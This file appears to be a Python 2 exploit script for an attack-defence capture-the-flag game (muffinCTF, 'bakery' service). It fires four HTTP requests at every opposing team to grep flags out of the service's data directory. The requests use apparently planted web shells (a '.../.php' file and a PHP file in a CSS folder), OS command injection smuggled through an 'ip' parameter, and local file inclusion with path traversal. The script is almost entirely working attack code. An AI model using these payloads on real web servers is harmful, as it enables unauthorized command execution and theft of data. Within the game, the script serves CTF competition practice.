#!/usr/bin/env python2

import requests
from tools import muffin_ctf

def get_flags(url):
    try:
        return requests.get(url).text
    except:
        return ''

def bakery_exploit(attack_url):
    output = ''

    # grep -hra muffinCTF /home/bakery/breads
    output += get_flags(attack_url + '.../.php?_=grep+-hra+muffinCTF+/home/bakery/breads')
    output += get_flags(attack_url + 'css/components/checkbox.php?_=grep+-hra+muffinCTF+/home/bakery/breads')
    output += get_flags(attack_url + 'inc/breadSend.php?ip=127.0.0.1%3Bgrep+-hra+muffinCTF+/home/bakery/breads')
    output += get_flags(attack_url + 'inc/inc.php?page=../../../var/www/html/index.php&c=grep+-hra+muffinCTF+/home/bakery/breads')

    return output

muffin_ctf.attack_all('bakery', bakery_exploit)
